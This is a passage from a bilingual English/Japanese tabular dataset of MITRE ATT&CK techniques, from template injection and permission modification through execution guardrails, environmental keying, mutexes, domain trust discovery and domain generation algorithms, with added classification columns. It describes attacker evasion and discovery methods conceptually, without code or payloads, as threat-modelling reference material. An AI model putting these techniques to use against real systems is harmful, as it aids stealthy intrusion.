T1221,,Template Injection,テンプレートインジェクション,"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017) Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded. Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017) Adversaries may also modify the <code>*\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files) This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)",攻撃者は、悪意のあるコードを隠蔽したり認証試行を強制したりするために、ユーザードキュメントテンプレート内の参照を作成または変更する可能性があります。例えば、MicrosoftのOffice Open XML（OOXML）仕様は、Office文書（.docx、.xlsx、.pptx）用のXMLベースのフォーマットを定義し、従来のバイナリフォーマット（.doc、.xls、.ppt）に取って代わります。 OOXMLファイルは、文書レンダリング方法を定義するプロパティを含む複数のXMLファイル（パーツと呼ばれる）で構成されるZIPアーカイブとして圧縮される。（引用元：Microsoft Open XML July 2017）パーツ内のプロパティは、オンラインURL経由でアクセスされる共有パブリックリソースを参照する場合がある。例えば、テンプレートプロパティは、文書読み込み時に取得される事前フォーマット済み文書の青写真として機能するファイルを参照することがある。 攻撃者はこれらのテンプレートを悪用し、ユーザー文書経由で実行される悪意のあるコードを初期段階で隠蔽する可能性があります。文書に注入されたテンプレート参照により、文書読み込み時に悪意のあるペイロードが取得・実行される可能性があります。（引用元：SANS Brian Wiltse Template Injection） これらの文書は[フィッシング](https://attack.mitre.org/techniques/T1566)や[共有コンテンツの汚染](https://attack.mitre.org/techniques/T1080)などの手法で配布され、悪意のあるペイロード取得後まで典型的な指標（VBAマクロ、スクリプト、 など）が存在しないため、悪意のあるペイロードが取得されるまで検出されません。（引用元：Redxorblue Remote Template Injection）実環境では、テンプレートインジェクションを利用してエクスプロイトを含む悪意のあるコードをロードした事例が確認されています。（引用元：MalwareBytes Template Injection OCT 2017）攻撃者はまた、.rtfファイル内の<code>*\template</code>制御語を改変し、同様に悪意のあるコードを隠蔽してダウンロードさせる可能性があります。 この正規の制御語値は、.rtfファイルが開かれた際に取得・読み込まれるテンプレートファイルリソースのファイル先を指定するものです。しかし攻撃者は、既存の.rtfファイルのバイトを改変し、悪意のあるペイロードのURLリソースを含むテンプレート制御語フィールドを挿入することが可能です。(引用: Proofpoint RTF Injection)(引用: Ciberseguridad Decoding malicious RTF files) この手法は、SMB/HTTPS（またはその他の認証情報要求）URLを注入し認証試行を誘発することで、[強制認証](https://attack.mitre.org/techniques/T1187)を可能にする場合もある。(引用: Anomali Template Injection MAR 2018)(引用: Talos Template Injection July 2017)(引用: ryhanson phishery SEPT 2016),defense-evasion,Windows,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534,2018-10-17T00:14:20.652Z,2025-04-25T15:16:15.516Z,,,,
T1222,,File and Directory Permissions Modification,ファイルおよびディレクトリの権限変更,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574). Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior)",攻撃者は、アクセス制御リスト（ACL）を回避し保護されたファイルにアクセスするため、ファイルまたはディレクトリの権限/属性を変更する可能性がある。(引用: Hybrid Analysis Icacls1 2018年6月)(引用: Hybrid Analysis Icacls2 2018年5月) ファイルおよびディレクトリの権限は、通常、ファイルまたはディレクトリの所有者、または適切な権限を持つユーザーによって設定されたACLによって管理される。 ファイルおよびディレクトリのACL実装はプラットフォームによって異なるが、一般にどのユーザーまたはグループがどの操作（読み取り、書き込み、実行など）を実行できるかを明示的に指定する。変更には特定のアクセス権の変更が含まれる場合があり、ファイルまたはディレクトリの既存の権限によっては、所有権の取得や昇格された権限が必要となる。これにより、特定のファイルやディレクトリの変更、置換、削除などの悪意のある活動が可能になる。 特定のファイルやディレクトリの変更は、多くの手法において必須のステップとなる場合があります。例としては、[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008) による永続化確立、[起動時/ログオン初期化スクリプト](https://attack.mitre.org/techniques/T1037)、 [Unixシェル設定変更](https://attack.mitre.org/techniques/T1546/004)、あるいは[実行フローの乗っ取り](https://attack.mitre.org/techniques/T1574)による他の重要なバイナリ/設定ファイルの汚染/乗っ取りなどです。攻撃者はシンボリックリンクの権限も変更する可能性があります。 例えば、マルウェア（特にランサムウェア）は、シンボリックリンクと関連設定を変更し、ローカルショートカットからリモートパスを持つファイルへのアクセスを可能にする場合があります。(引用: new_rust_based_ransomware)(引用: bad_luck_blackcat)(引用: falconoverwatch_blackcat_attack)(引用: blackmatter_blackcat)(引用: fsutil_behavior),defense-evasion,Linux;Windows;macOS;ESXi,script_command_execution,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196,2018-10-17T00:14:20.652Z,2025-04-16T20:37:17.378Z,,,,
T1222.001,T1222,Windows File and Directory Permissions Modification,Windowsファイルおよびディレクトリの権限変更,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018) Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",攻撃者は、アクセス制御リスト（ACL）を回避し保護されたファイルにアクセスするため、ファイルまたはディレクトリの権限/属性を変更する可能性がある。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) ファイルおよびディレクトリの権限は、通常、ファイルまたはディレクトリの所有者、または適切な権限を持つユーザーによって設定されたACLによって管理される。 ファイルおよびディレクトリの ACL の実装はプラットフォームによって異なりますが、一般に、どのユーザーまたはグループがどの操作（読み取り、書き込み、実行など）を実行できるかを明示的に指定します。 Windowsでは、ファイルおよびディレクトリのACLは任意アクセス制御リスト（DACL）として実装されています。（引用元：Microsoft DACL 2018年5月）標準的なACLと同様に、DACLは保護対象オブジェクトへのアクセスを許可または拒否されるアカウントを識別します。保護対象オブジェクトへのアクセスが試みられると、システムはDACL内のアクセス制御エントリを順に確認します。 一致するエントリが見つかった場合、オブジェクトへのアクセスが許可されます。一致しない場合はアクセスが拒否されます。（引用元：Microsoft Access Control Lists 2018年5月）攻撃者は`icacls`、`cacls`、`takeown`、`attrib`などのWindows組み込みコマンドを使用してDACLを操作でき、これにより特定のファイルやフォルダに対してより高い権限を付与することが可能です。 さらに、[PowerShell](https://attack.mitre.org/techniques/T1059/001) には、ファイルやディレクトリの DACL を取得または変更するために使用できるコマンドレットが用意されています。 特定のファイルやディレクトリの変更は、多くの手法において必須のステップとなる場合があります。例えば、[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)による永続性の確立、 [ブートまたはログオン初期化スクリプト](https://attack.mitre.org/techniques/T1037)による永続化確立、あるいは[実行フローのハイジャック](https://attack.mitre.org/techniques/T1574)による他の重要なバイナリ/設定ファイルの汚染/乗っ取りなどが挙げられます。,defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee,2020-02-04T19:17:41.767Z,2025-04-15T23:21:45.352Z,,,,
T1222.002,T1222,Linux and Mac File and Directory Permissions Modification,Linux および Mac のファイルおよびディレクトリ権限の変更,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode). Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques)",攻撃者は、アクセス制御リスト（ACL）を回避し保護されたファイルにアクセスするため、ファイルまたはディレクトリの権限/属性を変更する可能性がある。(引用: Hybrid Analysis Icacls1 2018年6月)(引用: Hybrid Analysis Icacls2 2018年5月) ファイルおよびディレクトリの権限は、通常、ファイルまたはディレクトリの所有者、または適切な権限を持つユーザーによって設定されたACLによって管理される。 ファイルおよびディレクトリのACL実装はプラットフォームによって異なるが、一般にどのユーザーまたはグループがどの操作（読み取り、書き込み、実行など）を実行できるかを明示的に指定する。ほとんどのLinuxおよびLinuxベースのプラットフォームは、各グループに適用される標準的な権限グループ（ユーザー、グループ、その他）と標準的な権限セット（読み取り、書き込み、実行）を提供する。 各プラットフォームの権限実装のニュアンスは異なる場合がありますが、ほとんどのプラットフォームではファイルおよびディレクトリのACLを操作するために主に2つのコマンドを提供しています：<code>chown</code>（所有者変更の略）と<code>chmod</code>（モード変更の略）。攻撃者はこれらのコマンドを使用して、ファイルやディレクトリの所有者を自身に変更したり、現在の権限が許可している場合はモードを変更したりすることがあります。その後、他のユーザーをファイルから締め出すことが可能です。 特定のファイルやディレクトリへの変更は、多くの手法において必須のステップとなる場合があります。例えば、[Unixシェル設定の変更](https://attack.mitre.org/techniques/T1546/004)による永続性の確立や、 [実行フローの乗っ取り](https://attack.mitre.org/techniques/T1574)による他の重要なバイナリ/設定ファイルの汚染/乗っ取りなどです。（出典: macOSにおける20の一般的なツールと手法）,defense-evasion,macOS;Linux,script_command_execution,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345,2020-02-04T19:24:27.774Z,2025-04-15T22:46:00.944Z,,,,
T1223,,Compiled HTML File,コンパイル済み HTML ファイル,"Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program) Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",コンパイル済みHTMLファイル（.chm）は、Microsoft HTML Helpシステムの一部として一般的に配布されます。CHMファイルは、HTML文書、画像、VBA、JScript、Java、ActiveXなどのスクリプト/Web関連プログラミング言語など、様々なコンテンツを圧縮したコンパイルファイルです。（出典：Microsoft HTML Help May 2018）CHMコンテンツは、HTML Help実行可能プログラム（hh.exe）によって読み込まれるInternet Explorerブラウザの基盤コンポーネント （引用元：Microsoft HTML Help ActiveX）によって読み込まれます。（引用元：Microsoft HTML Help Executable Program）攻撃者はこの技術を悪用し、悪意のあるコードを隠蔽する可能性があります。埋め込まれたペイロードを含むカスタムCHMファイルを被害者に配信し、[ユーザー実行](https://attack.mitre.org/techniques/T1204)によってトリガーされる可能性があります。 また、hh.exe経由のバイナリ実行を考慮していない古いシステムやパッチ未適用のシステムでは、CHMの実行がアプリケーションホワイトリストを迂回する可能性があります。（引用元：MsitPros CHM 2017年8月）（引用元：Microsoft CVE-2017-8625 2017年8月）,defense-evasion;execution,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a,2018-10-17T00:14:20.652Z,2025-04-25T15:16:12.199Z,,,,
T1480,,Execution Guardrails,実行ガードレール,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019) Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match. Adversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.(Citation: Trellix-Qakbot)",攻撃者は、標的に存在すると予想される、攻撃者が提供した環境固有の条件に基づいて、実行やアクションを制限するために実行ガードレールを使用する場合があります。 ガードレールはペイロードが意図した標的にのみ実行されることを保証し、攻撃者のキャンペーンによる付随的な被害を軽減する。(引用: FireEye Kevin Mandia Guardrails) 攻撃者が標的システムや環境についてガードレールとして提供できる値には、特定のネットワーク共有名、接続された物理デバイス、ファイル、参加しているActive Directory (AD) ドメイン、ローカル/外部IPアドレスなどが含まれる。（引用元：FireEye Outlook 2019年12月号）ガードレールは、侵害または運用対象外の環境における機能の露出を防ぐために使用できる。このガードレールの使用法は、典型的な[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)とは異なる。 [仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)では既知のサンドボックス値をチェックし、一致しない場合にのみ実行を継続するのに対し、ガードレールの使用では対象固有の期待値をチェックし、一致した場合にのみ実行を継続します。 攻撃者は防御を回避し、攻撃の効果が高い被害者やプラットフォームに攻撃範囲を絞るため、特定のユーザーエージェントを特定してブロックすることがあります。 ユーザーエージェントは、ユーザーのソフトウェアアプリケーション、オペレーティングシステム、ベンダー、バージョンなどのデータを自己識別します。攻撃者はユーザーエージェントを検査してオペレーティングシステムを特定し、その後、悪用可能なソフトウェアに対してのみマルウェアを配信し、他のすべてのオペレーティングシステムを無視する可能性があります。(引用元: Trellix-Qakbot),defense-evasion,Linux;macOS;Windows;ESXi,defense_disable,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852,2019-01-31T02:10:08.261Z,2025-04-15T19:58:48.316Z,,,,
T1480.001,T1480,Environmental Keying,環境キーイング,"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents) Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs). Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",攻撃者は防御を回避し、特定ターゲット環境への実行を制限するため、ペイロードやマルウェアのその他の機能を環境キーで制御する場合がある。環境キーは暗号技術を用い、ターゲットに存在すると予想される攻撃者が提供する環境固有の条件に基づいて、実行や動作を制限する。 環境キー設定は、特定のコンピューティング環境内の特定タイプの値から暗号化/復号鍵を導出する暗号技術を利用する[実行ガードレール](https://attack.mitre.org/techniques/T1480)の実装である。(引用: EK Clueless Agents) 値はターゲット固有の要素から導出され、暗号化されたペイロードの復号鍵生成に使用される。 標的特有の値は、特定のネットワーク共有、物理デバイス、ソフトウェア/ソフトウェアバージョン、ファイル、参加ADドメイン、システム時刻、ローカル/外部IPアドレスから導出可能である。(引用: Kaspersky Gauss Whitepaper)(引用: Proofpoint Router Malvertising)(引用: EK Impeding Malware Analysis)(引用: Environmental Keyed HTA)(引用: Ebowla: Genetic Malware) 標的特有の環境値から復号鍵を生成することで、環境キーイングはサンドボックス検知、アンチウイルス検知、情報クラウドソーシング、リバースエンジニアリングを困難にします。（引用元：Kaspersky Gauss Whitepaper）（引用元：Ebowla: Genetic Malware）こうした困難はインシデント対応プロセスを遅延させ、攻撃者が戦術・技術・手順（TTPs）を隠蔽するのを助長します。 [難読化されたファイルや情報](https://attack.mitre.org/techniques/T1027)と同様に、攻撃者は環境キーイングを利用してTTPを保護し、検知を回避する可能性がある。環境キーイングは、標的に暗号化されたペイロードを配信し、実行前に標的固有の値を用いてペイロードを復号化するために使用される。(引用: Kaspersky Gauss Whitepaper)(引用: EK Impeding Malware Analysis)(引用: Environmental Keyed HTA)(引用: Ebowla: Genetic Malware)(引用: Demiguise Guardrail Router Logo) 標的固有の値を用いてペイロードを復号化することで、攻撃者は復号鍵をペイロードに同梱したり、監視される可能性のあるネットワーク接続経由で送信したりすることを回避できます。 標的特有の値を収集する手法によっては、暗号化されたペイロードのリバースエンジニアリングが極めて困難になる。(引用: Kaspersky Gauss Whitepaper) これにより、侵害や運用を意図しない環境における機能の暴露を防ぐことが可能となる。 他の[実行ガードレール](https://attack.mitre.org/techniques/T1480)と同様に、環境キーイングは侵害または運用を意図しない環境における機能の暴露を防ぐために使用できる。この活動は典型的な[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)とは異なる。 [仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)では既知のサンドボックス値をチェックし、一致しない場合にのみ実行を継続する可能性があるのに対し、環境キーの使用では、復号化とその後続の実行を成功させるために一致が必須となる、対象固有の期待値をチェックすることになります。,defense-evasion,Linux;macOS;Windows,destructive_impact,stealth,endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--f244b8dd-af6c-4391-a497-fc03627ce995,2020-06-23T22:28:28.041Z,2025-04-15T19:59:20.646Z,,,,
T1480.002,T1480,Mutual Exclusion,排他制御,"Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.(Citation: Microsoft Mutexes) While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.(Citation: Microsoft Mutexes) By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.(Citation: Sans Mutexes 2012) In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.(Citation: Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023) Mutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation: ICS Mutexes 2015)",攻撃者は、マルウェアに関連付けられたミューテックスの存在に基づいて、実行やアクションを制限する場合があります。 ミューテックスはリソースへのアクセスを同期化するためのロック機構である。特定の時点でミューテックスを取得できるのは1つのスレッドまたはプロセスのみである。(引用元: Microsoft Mutexes) ローカルミューテックスは特定のプロセス内でのみ存在し、複数のスレッドによるリソースへのアクセス同期を可能にする一方、システムミューテックスは複数のプロセスの活動を同期化するために使用できる。(引用元: Microsoft Mutexes) 特定のマルウェアに関連付けられた一意のシステムミューテックスを作成することで、攻撃者はシステムが既に侵害されているかどうかを検証できます。(引用元: Sans Mutexes 2012) Linux環境では、マルウェアは代わりにミューテックスファイルのロック取得を試みる場合があります。 マルウェアがロックを取得できた場合、実行を継続します。失敗した場合、自身の第二インスタンス作成を回避するため終了します。(引用: Intezer RedXOR 2021)(引用: Deep Instinct BPFDoor 2023) ミュテックス名はハードコードされるか、予測可能なアルゴリズムを用いて動的に生成される場合があります。(引用: ICS Mutexes 2015),defense-evasion,Windows;Linux;macOS,other,stealth,authentication_system;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--49fca0d2-685d-41eb-8bd4-05451cc3a742,2024-09-19T14:00:03.401Z,2025-04-15T22:50:39.088Z,,,,
T1482,,Domain Trust Discovery,ドメイン信頼関係の発見,"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",攻撃者は、Windowsマルチドメイン/フォレスト環境における横方向移動の機会を特定するために利用可能な、ドメイン信頼関係に関する情報を収集しようとする可能性がある。 ドメイン信頼関係は、あるドメインが別のドメインの認証手順に基づいてリソースへのアクセスを許可する仕組みを提供する。(引用: Microsoft Trusts) ドメイン信頼関係により、信頼されたドメインのユーザーは信頼元のドメインのリソースにアクセスできる。発見された情報は、攻撃者が[SID履歴注入](https://attack.mitre.org/techniques/T1134/005)、 [チケットパス](https://attack.mitre.org/techniques/T1550/003)、[Kerberoasting](https://attack.mitre.org/techniques/T1558/003)を実行するのに役立つ可能性があります。(引用: AdSecurity Forging Trust Tickets)(引用: Harmj0y Domain Trusts) ドメイン信頼関係は、Win32 API呼び出し`DSEnumerateDomainTrusts()`、.NETメソッド、およびLDAPを使用して列挙可能です。(引用: Harmj0y Domain Trusts) Windowsユーティリティ[Nltest](https://attack.mitre.org/software/S0359)は、攻撃者がドメイン信頼関係を列挙するために使用することが知られている。(引用: Microsoft Operation Wilysupply),discovery,Windows,credential_abuse,situational_awareness,authentication_system;user_interaction;network_connectivity;cloud_control_plane,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0,2019-02-14T16:15:05.974Z,2025-04-15T22:22:35.004Z,,,,
T1483,,Domain Generation Algorithms,ドメイン生成アルゴリズム,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019) DGAs can take the form of apparently random or “gibberish Estrings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation) Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 